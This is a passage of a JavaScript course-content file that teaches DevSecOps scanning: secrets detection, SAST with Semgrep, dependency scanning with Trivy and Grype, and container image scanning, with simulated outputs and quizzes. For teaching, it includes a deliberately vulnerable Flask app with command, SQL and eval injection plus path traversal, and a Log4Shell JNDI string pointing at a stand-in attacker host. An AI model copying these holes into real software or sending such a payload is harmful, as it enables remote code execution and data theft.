        { objective: 'Run TruffleHog on filesystem', command: 'trufflehog filesystem . --json', output: '🐷🔑🐷  TruffleHog\n\nFound verified result\nDetector Type: AWS\nDecoder Type: PLAIN\nRaw: AKIAIOSFODNN7EXAMPLE\nFile: config.py\nLine: 8\n\nFound verified result\nDetector Type: Stripe\nDecoder Type: PLAIN\nRaw: sk_test_FAKE_ABCDEFxyz123456789\nFile: .env\nLine: 2\n\n✅ Found 2 verified results.', followUp: 'What detector type found the AWS key?', answer: 'AWS', hint: 'Look at the "Detector Type" field' },
        { objective: 'Scan git history with TruffleHog', command: 'trufflehog git file://. --json', output: '🐷🔑🐷  TruffleHog - Git Scanner\n\nScanning git history... 47 commits\n\nFound result in commit a1b2c3d (3 commits ago)\nDetector Type: AWS\nFile: old-config.py (deleted in HEAD)\nCommit: "remove old config" by dev@example.com\n\nFound result in commit e4f5a6b (HEAD)\nDetector Type: AWS\nFile: config.py\n\nFound result in commit e4f5a6b (HEAD)\nDetector Type: Stripe\nFile: .env\n\n✅ Found 3 results (1 from git history not in current files).', followUp: 'Did TruffleHog find secrets that Gitleaks missed in the current files?', answer: 'yes', hint: 'TruffleHog found a secret in a deleted file from git history' },
        { objective: 'Set up prevention with pre-commit hook', command: 'gitleaks protect --staged -v', output: 'Scanning staged changes...\n\n0 leaks found in staged changes ✅\n\nThis command is designed to run as a pre-commit hook.\nAdd to .git/hooks/pre-commit or use the pre-commit framework.', followUp: 'This would run as a _____ hook', answer: 'pre-commit', hint: 'Look at the output — it mentions what type of hook' },
      ],
    },
    execute: {
      intro: 'Create intentional secret files, scan them with real tools, then set up prevention.',
      commands: [
        { cmd: 'mkdir secrets-lab && cd secrets-lab && git init', desc: 'Create a test repo.' },
        { cmd: 'echo \'AWS_KEY="AKIAIOSFODNN7EXAMPLE"\' > config.py', desc: 'Create a file with a fake secret.' },
        { cmd: 'git add . && git commit -m "add config"', desc: 'Commit the secret.' },
        { cmd: 'gitleaks detect -v', desc: 'Scan for secrets with Gitleaks (install: brew install gitleaks).' },
        { cmd: 'gitleaks detect --report-format json --report-path report.json', desc: 'Generate a JSON report.' },
        { cmd: 'trufflehog filesystem . --json', desc: 'Scan with TruffleHog (install: brew install trufflehog).' },
        { cmd: 'trufflehog git file://. --json', desc: 'Scan git history for secrets in old commits.' },
      ],
    },
    verify: [
      'Run gitleaks detect on any real repo you have. How many findings?',
      'What version of Gitleaks are you running?',
    ],
    quiz: [
      { q: "What is the most common way secrets leak?", opts: ["Email attachments", "Committed to code repositories", "Verbal disclosure", "USB drives"], answer: 1, explanation: "The most common secret leak vector is developers accidentally committing credentials, API keys, and tokens to code repositories." },
      { q: "What's the difference between Gitleaks and TruffleHog?", opts: ["They're identical", "Gitleaks is regex-based and fast; TruffleHog also uses entropy detection and can verify if secrets are still active", "TruffleHog only works on GitHub", "Gitleaks only scans .env files"], answer: 1, explanation: "Gitleaks uses regex patterns and is very fast. TruffleHog combines regex with entropy analysis and can verify credentials by testing if they're still active." },
      { q: "Why is a pre-commit hook better than post-commit scanning?", opts: ["It's faster", "It prevents secrets from entering git history in the first place", "It's easier to install", "It works offline"], answer: 1, explanation: "Pre-commit hooks block the commit before it happens, preventing secrets from entering git history. Once in history, secrets are very hard to fully remove." },
      { q: "What is the SARIF format used for?", opts: ["Docker configuration", "A standardized format for exchanging security analysis results between tools", "Git commit messages", "API authentication"], answer: 1, explanation: "SARIF (Static Analysis Results Interchange Format) is a standard JSON format for security tool results, enabling integration between scanners and IDEs/CI systems." },
      { q: "A secret was found in git history from 6 months ago. What should you do FIRST?", opts: ["Delete the git history", "Rotate/revoke the secret immediately", "Blame the developer", "Ignore it — it's old"], answer: 1, explanation: "Always rotate/revoke compromised credentials immediately, regardless of age. You don't know if they've already been extracted and used." },
    ],
  },
  '2.2': {
    id: '2.2', pathId: 2, title: 'SAST — Static Application Security Testing', baseXP: 120, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'What is SAST?', blocks: [
          { type: 'text', content: 'Static Application Security Testing (SAST) analyzes source code WITHOUT executing it. It reads your code like a very thorough code reviewer, looking for patterns that indicate vulnerabilities — SQL injection, command injection, XSS, insecure cryptography, and more.' },
          { type: 'callout', variant: 'key-concept', title: 'Static = No Execution', content: 'SAST tools parse and analyze source code, bytecode, or binaries without running the application. This means they can run very early in the development lifecycle — even in your IDE or pre-commit hooks.' },
          { type: 'keyterms', terms: [
            { term: 'SQL Injection', definition: 'User input inserted directly into SQL queries, allowing attackers to read/modify the database.' },
            { term: 'Command Injection', definition: 'User input passed to OS commands (os.system, subprocess), letting attackers execute arbitrary commands.' },
            { term: 'XSS', definition: 'Cross-Site Scripting — user input rendered as HTML/JS in the browser, enabling session hijacking.' },
            { term: 'Path Traversal', definition: 'User input used in file paths (../../etc/passwd), allowing access to arbitrary files.' },
            { term: 'Insecure Deserialization', definition: 'Untrusted data deserialized into objects, potentially executing malicious code.' },
          ] },
        ] },
        { heading: 'How SAST Works', blocks: [
          { type: 'text', content: 'SAST tools use multiple techniques to find vulnerabilities. The most effective tools combine all three approaches for comprehensive analysis.' },
          { type: 'steps', steps: [
            { label: 'Parsing', detail: 'Source code is parsed into an Abstract Syntax Tree (AST) — a structured representation of the code that tools can analyze programmatically.' },
            { label: 'Pattern Matching', detail: 'Known vulnerability signatures are matched against the AST. For example, detecting eval() called with user-controlled input.' },
            { label: 'Taint Analysis', detail: 'Tracks how user-controlled data ("tainted" input) flows through the code. If tainted data reaches a dangerous function (sink) without sanitization, it flags a vulnerability.' },
            { label: 'Control Flow Analysis', detail: 'Examines the execution paths through the code to determine if a vulnerable code path is actually reachable.' },
          ] },
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'Source Code', note: 'Your application files' },
            { label: 'AST Parser', note: 'Builds syntax tree' },
            { label: 'Rule Engine', note: 'Pattern + taint analysis' },
            { label: 'Findings', note: 'Vulnerabilities with severity' },
            { label: 'SARIF Report', note: 'Standardized output' },
          ] },
        ] },
        { heading: 'Strengths & Weaknesses', blocks: [
          { type: 'comparison', items: [
            { title: 'Strengths', color: '#22C55E', points: [
              'Finds code-level vulnerabilities early in development',
              'Full coverage of entire codebase — scans every line',
              'Runs before deployment (shift-left security)',
              'Language-specific deep analysis and custom rules',
              'Fast feedback loop for developers in CI/CD',
            ] },
            { title: 'Weaknesses', color: '#EF4444', points: [
              'High false positive rate (flags code that isn\'t actually vulnerable)',
              'Cannot find runtime issues (misconfigurations, auth bypass)',
              'Requires tuning per project to reduce noise',
              'Limited understanding of business logic',
              'May miss vulnerabilities in dynamically generated code',
            ] },
          ] },
          { type: 'callout', variant: 'tip', title: 'Reducing False Positives', content: 'Start with a small, high-confidence rule set. Gradually add rules and tune thresholds. Use Semgrep\'s "nosemgrep" comments for verified false positives. Track your false positive rate over time.' },
        ] },
        { heading: 'Semgrep vs Others', blocks: [
          { type: 'text', content: 'Several SAST tools exist, each with different strengths. Semgrep has become the go-to for DevSecOps pipelines due to its speed, simplicity, and extensibility.' },
          { type: 'comparison', items: [
            { title: 'Semgrep', color: '#22C55E', points: [
              'Open-source, fast, 30+ languages',
              'Custom rules written in simple YAML',
              'OWASP Top 10 and CWE rule packs',
              'Runs in seconds in CI/CD pipelines',
            ] },
            { title: 'SonarQube', color: '#3B82F6', points: [
              'Enterprise-grade with dashboards',
              'Code quality + security combined',
              'Historical trend tracking',
              'Paid for advanced features',
            ] },
            { title: 'CodeQL', color: '#A78BFA', points: [
              'GitHub-native, deep semantic queries',
              'Powerful but complex query language',
              'Excellent for complex data flow analysis',
              'Slower — better for nightly scans',
            ] },
          ] },
          { type: 'scan-output', tool: 'semgrep', title: 'Semgrep OWASP Scan Output', findings: [
            { type: 'header', text: '$ semgrep scan --config "p/owasp-top-ten"' },
            { type: 'finding', text: 'A03:Injection — os.system() with user input', severity: 'ERROR', file: 'app.py:11' },
            { type: 'finding', text: 'A03:Injection — subprocess.call(shell=True)', severity: 'ERROR', file: 'app.py:17' },
            { type: 'finding', text: 'A03:Injection — f-string in SQL query', severity: 'ERROR', file: 'app.py:24' },
            { type: 'finding', text: 'A03:Injection — eval() with user input', severity: 'ERROR', file: 'app.py:30' },
            { type: 'finding', text: 'A01:Access — open() with user-controlled path', severity: 'WARNING', file: 'app.py:36' },
            { type: 'summary', text: 'Ran 89 rules on 1 file: 5 findings (4 ERROR, 1 WARNING)' },
          ] },
        ] },
        { heading: 'SARIF Format', blocks: [
          { type: 'text', content: 'SARIF (Static Analysis Results Interchange Format) is the standard JSON format for exchanging security findings between tools, IDEs, and CI/CD platforms.' },
          { type: 'pipeline', stages: [
            { label: 'SAST Tool', icon: 'scan', desc: 'Semgrep, CodeQL, etc.', security: true, tool: 'semgrep' },
            { label: 'SARIF Output', icon: 'file', desc: 'Standardized JSON report', security: false, tool: 'sarif' },
            { label: 'GitHub Security', icon: 'shield', desc: 'Code scanning alerts tab', security: true, tool: 'github' },
            { label: 'IDE Integration', icon: 'code', desc: 'Inline findings in VS Code', security: false, tool: 'vscode' },
          ] },
          { type: 'callout', variant: 'tip', title: 'SARIF Everywhere', content: 'Upload SARIF to GitHub\'s Security tab to see findings inline in pull requests. VS Code and JetBrains IDEs can import SARIF to show findings directly in your editor. One format, many consumers.' },
        ] },
      ],
    },
    simulation: {
      title: 'Find the Vulnerabilities',
      scenario: "You're auditing a Python Flask application before release. The code has multiple security vulnerabilities. Use Semgrep to find them all.",
      files: {
        'audit/': {
          'vulnerable_app.py': 'from flask import Flask, request\nimport os\nimport subprocess\nimport sqlite3\n\napp = Flask(__name__)\n\n@app.route("/ping")\ndef ping():\n    host = request.args.get("host")\n    result = os.system(f"ping -c 1 {host}")  # Line 11: Command injection\n    return f"Result: {result}"\n\n@app.route("/run")\ndef run_cmd():\n    cmd = request.args.get("cmd")\n    output = subprocess.call(cmd, shell=True)  # Line 17: Shell injection\n    return str(output)\n\n@app.route("/users")\ndef get_users():\n    name = request.args.get("name")\n    conn = sqlite3.connect("app.db")\n    users = conn.execute(f"SELECT * FROM users WHERE name = \'{name}\'")  # Line 24: SQL injection\n    return str(users.fetchall())\n\n@app.route("/eval")\ndef eval_code():\n    code = request.args.get("code")\n    result = eval(code)  # Line 30: Arbitrary code execution\n    return str(result)\n\n@app.route("/read")\ndef read_file():\n    path = request.args.get("path")\n    with open(path) as f:  # Line 36: Path traversal\n        return f.read()',
        },
      },
      steps: [
        { objective: 'Review the code manually — how many vulnerabilities can you spot?', command: 'cat vulnerable_app.py', output: '(file content displayed in file browser)', followUp: 'How many security issues do you see in vulnerable_app.py?', answer: '5', hint: 'Look for os.system, subprocess.call with shell=True, f-string in SQL, eval(), and open() with user input' },
        { objective: 'Run Semgrep with auto-detect', command: 'semgrep scan --config auto', output: 'Scanning 1 file with 487 rules...\n\n  vulnerable_app.py\n    python.lang.security.dangerous-system-call     L11  os.system(f"ping -c 1 {host}")       ERROR\n    python.lang.security.audit.subprocess-shell     L17  subprocess.call(cmd, shell=True)     WARNING\n    python.lang.security.audit.formatted-sql-query  L24  conn.execute(f"SELECT * FROM...)     ERROR\n    python.lang.security.dangerous-eval-use         L30  eval(code)                           ERROR\n    python.lang.security.audit.open-pathtraversal   L36  open(path)                           WARNING\n\n  Ran 487 rules on 1 file: 5 findings (3 ERROR, 2 WARNING)', followUp: 'How many findings did Semgrep report?', answer: '5', hint: 'Look at the summary line at the bottom' },
        { objective: 'Run with OWASP Top 10 rules', command: 'semgrep scan --config "p/owasp-top-ten"', output: 'Running \'owasp-top-ten\' ruleset (89 rules)...\n\n  vulnerable_app.py\n    A03:Injection    3 findings  (L11, L17, L24)\n    A03:Injection    1 finding   (L30 - eval)\n    A01:Access       1 finding   (L36 - path traversal)\n\n  Ran 89 rules on 1 file: 5 findings', followUp: 'Which OWASP category appears most?', answer: 'A03', hint: 'Count the findings per OWASP category' },
        { objective: 'Run with security audit rules', command: 'semgrep scan --config "p/security-audit"', output: 'Running \'security-audit\' ruleset (312 rules)...\n\n  vulnerable_app.py\n    7 findings (3 ERROR, 3 WARNING, 1 INFO)\n\n  Additional findings vs auto:\n    + Missing CSRF protection (INFO)\n    + Debug mode detection (WARNING)\n\n  Ran 312 rules on 1 file: 7 findings', followUp: 'Did security-audit find more or fewer issues than auto?', answer: 'more', hint: 'Compare 7 findings vs 5 findings' },
        { objective: 'Generate a JSON report', command: 'semgrep scan --config auto --json -o report.json', output: 'Scanning 1 file with 487 rules...\n5 findings\n📝 Results saved to report.json', followUp: 'What severity level are the injection findings?', answer: 'error', hint: 'Look at the severity in the scan output — injection findings are marked ERROR' },
        { objective: 'Write and run a custom rule', command: 'semgrep scan --config custom-rules.yaml vulnerable_app.py', output: 'Running 2 custom rules...\n\n  vulnerable_app.py\n    custom.dangerous-os-system   L11  os.system() with user input     ERROR\n    custom.sql-injection         L24  f-string in SQL query           ERROR\n\n  Ran 2 rules: 2 findings from custom rules', followUp: 'Custom rules let you enforce ___-specific policies', answer: 'organization', hint: 'Custom rules are typically written for your specific organization\'s patterns' },
      ],
    },
    execute: {
      intro: 'Run SAST scans on real vulnerable applications.',
      commands: [
        { cmd: 'pip install semgrep', desc: 'Install Semgrep (or: brew install semgrep).' },
        { cmd: 'semgrep scan --config auto', desc: 'Run auto-detection scan on current directory.' },
        { cmd: 'semgrep scan --config "p/owasp-top-ten"', desc: 'Run OWASP Top 10 specific rules.' },
        { cmd: 'semgrep scan --config "p/security-audit"', desc: 'Run comprehensive security audit.' },
        { cmd: 'semgrep scan --config auto --json -o report.json', desc: 'Generate JSON report.' },
        { cmd: 'semgrep scan --config auto --sarif -o report.sarif', desc: 'Generate SARIF report for IDE/GitHub integration.' },
      ],
    },
    verify: [
      'How many total findings does `semgrep scan --config auto` report on your project?',
      'What languages did Semgrep auto-detect?',
    ],
    quiz: [
      { q: "What does SAST stand for?", opts: ["Software Application Security Testing", "Static Application Security Testing", "Source Audit Security Tool", "System Analysis Security Technology"], answer: 1, explanation: "SAST = Static Application Security Testing. It analyzes source code without executing it." },
      { q: "What is the main weakness of SAST?", opts: ["It's too slow", "High false positive rate and can't find runtime issues", "It only works on Java", "It requires root access"], answer: 1, explanation: "SAST can produce many false positives and cannot detect runtime issues like misconfigured servers, broken authentication flows, or business logic flaws." },
      { q: "What is taint analysis?", opts: ["Checking for code comments", "Tracking how user-controlled input flows through the code to dangerous functions", "Scanning for malware", "Monitoring network traffic"], answer: 1, explanation: "Taint analysis traces user-controlled data (\"tainted\" input) through the code to see if it reaches dangerous functions (sinks) without proper sanitization." },
      { q: "Why is Semgrep popular for DevSecOps pipelines?", opts: ["It's the most expensive", "It's fast, supports 30+ languages, and allows custom rules in simple YAML", "It was created by OWASP", "It replaces all other security tools"], answer: 1, explanation: "Semgrep is fast enough for CI/CD, supports many languages, and its YAML-based custom rules make it easy to enforce organization-specific policies." },
      { q: "What format should you use to upload SAST results to GitHub Security tab?", opts: ["JSON", "XML", "SARIF", "CSV"], answer: 2, explanation: "SARIF (Static Analysis Results Interchange Format) is the standard format GitHub uses to display security findings in the Security tab." },
    ],
  },
  '2.3': {
    id: '2.3', pathId: 2, title: 'SCA — Software Composition Analysis', baseXP: 120, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'What is SCA?', blocks: [
          { type: 'text', content: 'Software Composition Analysis (SCA) scans your project\'s dependencies — the open-source libraries and packages you use. It checks them against vulnerability databases like the National Vulnerability Database (NVD) to find known security issues (CVEs).' },
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'Your Code', note: '10-20% of total' },
            { label: 'Direct Deps', note: 'package.json, requirements.txt' },
            { label: 'Transitive Deps', note: 'Dependencies of dependencies' },
            { label: 'SCA Scanner', note: 'Trivy, Grype, Snyk' },
            { label: 'CVE Report', note: 'Known vulnerabilities found' },
          ] },
          { type: 'callout', variant: 'key-concept', title: 'Why SCA Exists', content: 'You don\'t write most of your application\'s code — open-source libraries do. SCA ensures those libraries don\'t have known security holes that attackers can exploit.' },
        ] },
        { heading: 'Why SCA Matters', blocks: [
          { type: 'text', content: '80-90% of modern application code comes from open-source dependencies. You might write 10% of the code, but you are responsible for 100% of the security. A single vulnerable dependency can compromise your entire application.' },
          { type: 'callout', variant: 'warning', title: 'Log4Shell (CVE-2021-44228)', content: 'In December 2021, a critical vulnerability in the log4j logging library affected millions of Java applications worldwide. A single dependency — used by almost every Java project — allowed remote code execution with a simple string like ${jndi:ldap://attacker.com/exploit}. CVSS score: 10.0 (maximum severity).' },
          { type: 'severity-bars', title: 'Typical Dependency Vulnerability Breakdown', items: [
            { rank: 1, label: 'CRITICAL (CVSS 9.0-10.0)', count: 3, color: '#EF4444' },
            { rank: 2, label: 'HIGH (CVSS 7.0-8.9)', count: 8, color: '#F97316' },
            { rank: 3, label: 'MEDIUM (CVSS 4.0-6.9)', count: 14, color: '#F59E0B' },
            { rank: 4, label: 'LOW (CVSS 0.1-3.9)', count: 7, color: '#3B82F6' },
          ] },
        ] },
        { heading: 'CVEs, CVSS, and NVD', blocks: [
          { type: 'keyterms', terms: [
            { term: 'CVE', definition: 'Common Vulnerabilities and Exposures — unique identifiers for known vulnerabilities (e.g., CVE-2021-44228 for Log4Shell).' },
            { term: 'CVSS', definition: 'Common Vulnerability Scoring System — rates severity from 0 to 10. Critical >= 9.0, High >= 7.0, Medium >= 4.0, Low < 4.0.' },
            { term: 'NVD', definition: 'National Vulnerability Database — the US government\'s central repository of vulnerability data, maintained by NIST.' },
            { term: 'GHSA', definition: 'GitHub Security Advisory — GitHub\'s own vulnerability database, often faster to update than NVD.' },
            { term: 'EPSS', definition: 'Exploit Prediction Scoring System — predicts the probability a vulnerability will be exploited in the wild.' },
          ] },
          { type: 'callout', variant: 'tip', title: 'Prioritization Strategy', content: 'Don\'t try to fix all vulnerabilities at once. Focus on CRITICAL and HIGH severity with known exploits first. Use EPSS scores to identify vulnerabilities most likely to be actively exploited.' },
        ] },
        { heading: 'Direct vs Transitive Dependencies', blocks: [
          { type: 'text', content: 'Direct dependencies are packages you explicitly install. Transitive dependencies are packages those packages depend on. You might have 20 direct dependencies but 500+ transitive ones — and vulnerabilities in transitive deps are just as dangerous.' },
          { type: 'comparison', items: [
            { title: 'Direct Dependencies', color: '#3B82F6', points: [
              'Listed in your package.json or requirements.txt',
              'You chose them — you know they exist',
              'Easy to update: change the version number',
              'Example: express, lodash, axios',
            ] },
            { title: 'Transitive Dependencies', color: '#F59E0B', points: [
              'Pulled in automatically by your direct deps',
              'Often invisible — you may not know they exist',
              'Harder to fix: may need to update the parent dep',
              'Example: minimist (dep of hundreds of packages)',
            ] },
          ] },
          { type: 'scan-output', tool: 'trivy', title: 'Trivy Dependency Scan', findings: [
            { type: 'header', text: '$ trivy fs . --scanners vuln' },
            { type: 'finding', text: 'axios 0.21.1 — SSRF via follow redirects', severity: 'CRITICAL', file: 'Fixed: 0.28.0' },
            { type: 'finding', text: 'minimist 1.2.5 — Prototype Pollution', severity: 'CRITICAL', file: 'Fixed: 1.2.6' },
            { type: 'finding', text: 'jsonwebtoken 8.5.0 — Insecure key handling', severity: 'HIGH', file: 'Fixed: 9.0.0' },
            { type: 'finding', text: 'lodash 4.17.20 — Command Injection', severity: 'HIGH', file: 'Fixed: 4.17.21' },
            { type: 'finding', text: 'node-fetch 2.6.1 — Exposure of sensitive info', severity: 'HIGH', file: 'Fixed: 2.6.7' },
            { type: 'summary', text: 'Total: 23 vulnerabilities (LOW: 5, MEDIUM: 7, HIGH: 8, CRITICAL: 3)' },
          ] },
        ] },
        { heading: 'Tool Comparison', blocks: [
          { type: 'comparison', items: [
            { title: 'Trivy', color: '#22C55E', points: [
              'Fast, multi-target (fs, image, IaC)',
              'Free and open-source (Aqua Security)',
              'JSON, SARIF, table output formats',
              'Best all-in-one scanner',
            ] },
            { title: 'Grype', color: '#3B82F6', points: [
              'Fast, focused on SCA',
              'Anchore-backed, good formatting',
              '--only-fixed shows actionable results',
              'Slightly different vuln database',
            ] },
            { title: 'Snyk', color: '#A78BFA', points: [
              'Commercial with free tier',
              'Auto-creates fix PRs in GitHub',
              'IDE integration (VS Code, IntelliJ)',
              'Best developer experience',
            ] },
          ] },
          { type: 'callout', variant: 'tip', title: 'Use Multiple Tools', content: 'Trivy and Grype often report slightly different vulnerability counts because they use different databases and detection methods. Running both provides better coverage than either alone.' },
        ] },
      ],
    },
    simulation: {
      title: 'Audit the Dependencies',
      scenario: "A team wants to deploy a Node.js app. Before approving, you need to check if any dependencies have known vulnerabilities.",
      files: {
        'webapp/': {
          'package.json': '{\n  "name": "webapp",\n  "version": "1.0.0",\n  "dependencies": {\n    "express": "4.17.1",\n    "lodash": "4.17.20",\n    "axios": "0.21.1",\n    "jsonwebtoken": "8.5.0",\n    "minimist": "1.2.5",\n    "node-fetch": "2.6.1",\n    "qs": "6.5.2",\n    "tar": "6.1.0"\n  }\n}',
          'package-lock.json': '(lock file with pinned transitive dependencies)',
          'server.js': 'const express = require("express");\nconst app = express();\n\napp.get("/", (req, res) => res.send("Hello"));\napp.listen(3000);',
        },
      },
      steps: [
        { objective: 'Scan dependencies with Trivy', command: 'trivy fs . --scanners vuln', output: 'Scanning filesystem...\n\npackage-lock.json (npm)\n\nTotal: 23 vulnerabilities (LOW: 5, MEDIUM: 7, HIGH: 8, CRITICAL: 3)\n\n┌──────────────────┬────────────────┬──────────┬────────────┬───────────────┐\n│     Library      │ Vulnerability  │ Severity │  Installed │    Fixed      │\n├──────────────────┼────────────────┼──────────┼────────────┼───────────────┤\n│ axios            │ CVE-2023-45857 │ CRITICAL │ 0.21.1     │ 0.28.0        │\n│ jsonwebtoken     │ CVE-2022-23529 │ HIGH     │ 8.5.0      │ 9.0.0         │\n│ lodash           │ CVE-2021-23337 │ HIGH     │ 4.17.20    │ 4.17.21       │\n│ minimist         │ CVE-2021-44906 │ CRITICAL │ 1.2.5      │ 1.2.6         │\n│ node-fetch       │ CVE-2022-0235  │ HIGH     │ 2.6.1      │ 2.6.7         │\n│ tar              │ CVE-2021-37701 │ HIGH     │ 6.1.0      │ 6.1.9         │\n│ qs               │ CVE-2022-24999 │ HIGH     │ 6.5.2      │ 6.5.3         │\n│ ... (16 more)    │                │          │            │               │\n└──────────────────┴────────────────┴──────────┴────────────┴───────────────┘', followUp: 'How many HIGH severity vulnerabilities?', answer: '8', hint: 'Look at the total line: HIGH: 8' },
        { objective: 'Filter to critical only', command: 'trivy fs . --scanners vuln --severity HIGH,CRITICAL', output: 'Total: 11 (HIGH: 8, CRITICAL: 3)\n\n(showing only HIGH and CRITICAL findings)', followUp: 'How many total HIGH+CRITICAL?', answer: '11', hint: 'Look at the total: 8 + 3 = 11' },
        { objective: 'Scan with Grype for comparison', command: 'grype .', output: 'NAME           INSTALLED  FIXED-IN   TYPE  VULNERABILITY   SEVERITY\naxios          0.21.1     0.28.0     npm   CVE-2023-45857  Critical\naxios          0.21.1     1.6.0      npm   CVE-2023-26159  High\njsonwebtoken   8.5.0      9.0.0      npm   CVE-2022-23529  High\nlodash         4.17.20    4.17.21    npm   CVE-2021-23337  High\nminimist       1.2.5      1.2.6      npm   CVE-2021-44906  Critical\nnode-fetch     2.6.1      2.6.7      npm   CVE-2022-0235   High\ntar            6.1.0      6.1.9      npm   CVE-2021-37701  High\nqs             6.5.2      6.5.3      npm   CVE-2022-24999  High\n... (17 more)\n\n25 vulnerabilities found', followUp: 'Did Grype find more or fewer than Trivy?', answer: 'more', hint: 'Trivy found 23, Grype found 25. Different tools have slightly different databases.' },
        { objective: 'Check which vulns have fixes available', command: 'grype . --only-fixed', output: 'Showing only vulnerabilities with available fixes:\n\n18 fixable vulnerabilities found\n\n(All CRITICAL and HIGH findings have patches available)', followUp: 'How many vulnerabilities have available patches?', answer: '18', hint: 'Look at the count of fixable vulnerabilities' },
        { objective: 'Generate a report for the team', command: 'trivy fs . --scanners vuln --format json -o report.json', output: 'Scanning filesystem...\nTotal: 23 vulnerabilities\n📝 Report saved to report.json', followUp: 'What format should you use for CI/CD integration?', answer: 'json', hint: 'JSON and SARIF are the standard formats for CI/CD integration' },
      ],
    },
    execute: {
      intro: 'Scan dependencies in a real Node.js project.',
      commands: [
        { cmd: 'trivy fs . --scanners vuln', desc: 'Scan current project dependencies.' },
        { cmd: 'trivy fs . --scanners vuln --severity HIGH,CRITICAL', desc: 'Filter to high and critical only.' },
        { cmd: 'grype .', desc: 'Scan with Grype for comparison (install: brew install grype).' },
        { cmd: 'grype . --only-fixed', desc: 'Show only vulnerabilities with available fixes.' },
        { cmd: 'trivy fs . --scanners vuln --format json -o report.json', desc: 'Generate JSON report.' },
      ],
    },
    verify: [
      "Run `trivy fs . --scanners vuln` on any Node.js project. What's the total vulnerability count?",
      'What version of Trivy are you running?',
    ],
    quiz: [
      { q: "What does SCA scan?", opts: ["Your source code logic", "Your project's open-source dependencies for known vulnerabilities", "Network traffic", "Container configurations"], answer: 1, explanation: "SCA scans the third-party libraries and packages your project depends on, checking them against vulnerability databases." },
      { q: "What is a transitive dependency?", opts: ["A dependency you installed directly", "A dependency of your dependency — you didn't install it directly", "A development-only dependency", "A deprecated package"], answer: 1, explanation: "Transitive dependencies are packages that your direct dependencies depend on. You may have hundreds of them without knowing." },
      { q: "What does CVSS measure?", opts: ["Code complexity", "The severity of a vulnerability on a 0-10 scale", "Container size", "CI/CD pipeline speed"], answer: 1, explanation: "CVSS (Common Vulnerability Scoring System) rates vulnerability severity from 0 to 10. Critical ≥ 9.0, High ≥ 7.0, Medium ≥ 4.0, Low < 4.0." },
      { q: "What percentage of modern app code typically comes from open-source?", opts: ["10-20%", "30-40%", "50-60%", "80-90%"], answer: 3, explanation: "Studies consistently show 80-90% of code in modern applications comes from open-source dependencies, making SCA critical." },
      { q: "Why might Trivy and Grype report different vulnerability counts?", opts: ["One is broken", "They use slightly different vulnerability databases and detection methods", "They scan different file types", "One is newer"], answer: 1, explanation: "Different SCA tools use different vulnerability databases, detection algorithms, and matching logic, leading to slightly different results. Using multiple tools provides better coverage." },
    ],
  },
  '2.4': {
    id: '2.4', pathId: 2, title: 'Container Image Scanning', baseXP: 120, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'Why Scan Container Images?', blocks: [
          { type: 'text', content: 'Container images bundle your application with an entire OS and its libraries. Each installed package can have known vulnerabilities. An nginx image might have 40+ CVEs just from its base OS packages — before you add a single line of your own code.' },
          { type: 'pipeline', stages: [
            { label: 'Base Image', icon: 'box', desc: 'OS packages (debian, alpine)', security: false, tool: 'docker' },
            { label: 'App Dependencies', icon: 'package', desc: 'pip, npm, gem installs', security: false, tool: 'package-manager' },
            { label: 'Your Code', icon: 'code', desc: 'Application source', security: false, tool: 'app' },
            { label: 'Image Scan', icon: 'shield', desc: 'Trivy finds CVEs in all layers', security: true, tool: 'trivy' },
            { label: 'Deploy Gate', icon: 'lock', desc: 'Block if CRITICAL found', security: true, tool: 'ci-cd' },
          ] },
          { type: 'scan-output', tool: 'trivy', title: 'Trivy Image Scan — nginx:latest', findings: [
            { type: 'header', text: '$ trivy image nginx:latest' },
            { type: 'finding', text: 'CVE-2024-0727 openssl 3.0.11 — Denial of Service', severity: 'CRITICAL', file: 'Fixed: 3.0.13' },
            { type: 'finding', text: 'CVE-2023-44487 nghttp2 1.57.0 — HTTP/2 Rapid Reset', severity: 'CRITICAL', file: 'Fixed: 1.58.0' },
            { type: 'finding', text: 'CVE-2023-6246 glibc 2.36 — Buffer overflow', severity: 'CRITICAL', file: 'Fixed: 2.36-10' },
            { type: 'finding', text: 'CVE-2024-1086 libcurl 8.4.0 — Use after free', severity: 'CRITICAL', file: 'Fixed: 8.6.0' },
            { type: 'summary', text: 'Total: 45 vulnerabilities (LOW: 10, MEDIUM: 19, HIGH: 12, CRITICAL: 4)' },
          ] },
        ] },
        { heading: 'Build-time vs Registry vs Runtime', blocks: [
          { type: 'text', content: 'A comprehensive container security strategy scans at three stages. Build-time scanning in CI/CD is the most critical for DevSecOps because it catches issues before images are deployed.' },
          { type: 'steps', steps: [
            { label: 'Build-time (CI/CD)', detail: 'Scan during image build in your pipeline. Fail the build if CRITICAL vulnerabilities are found. This is the earliest and cheapest place to catch issues.' },
            { label: 'Registry Scanning', detail: 'Scan images when pushed to your container registry (ECR, GCR, Docker Hub). Blocks vulnerable images from being pulled for deployment.' },
            { label: 'Runtime Monitoring', detail: 'Periodically rescan running containers for newly disclosed CVEs. A safe image today may become vulnerable tomorrow when a new CVE is published.' },
          ] },
          { type: 'callout', variant: 'key-concept', title: 'Shift Left', content: 'Build-time scanning is the most impactful. Catching a vulnerability during CI/CD costs minutes of developer time. Finding it in production costs hours of incident response.' },
        ] },
        { heading: 'Base Image Selection', blocks: [
          { type: 'text', content: 'Your base image determines your vulnerability baseline. Smaller images have fewer packages, which means fewer potential CVEs. Choosing the right base image is the single most impactful security decision for containers.' },
          { type: 'comparison', items: [
            { title: 'Full (python:3.12)', color: '#EF4444', points: [
              'Size: ~1.0 GB',
              'Hundreds of OS packages installed',
              'Typically 100+ CVEs',
              'Good for development, bad for production',
            ] },
            { title: 'Slim (python:3.12-slim)', color: '#F59E0B', points: [
              'Size: ~155 MB',
              'Minimal OS packages',
              'Typically 20-40 CVEs',
              'Good balance for most applications',
            ] },
            { title: 'Alpine (python:3.12-alpine)', color: '#22C55E', points: [
              'Size: ~52 MB',
              'Uses musl libc (not glibc)',
              'Typically 5-15 CVEs',
              'Smallest attack surface, some compatibility issues',
            ] },
          ] },
          { type: 'severity-bars', title: 'Vulnerability Count by Base Image', items: [
            { rank: 1, label: 'python:3.12 (full)', count: 127, color: '#EF4444' },
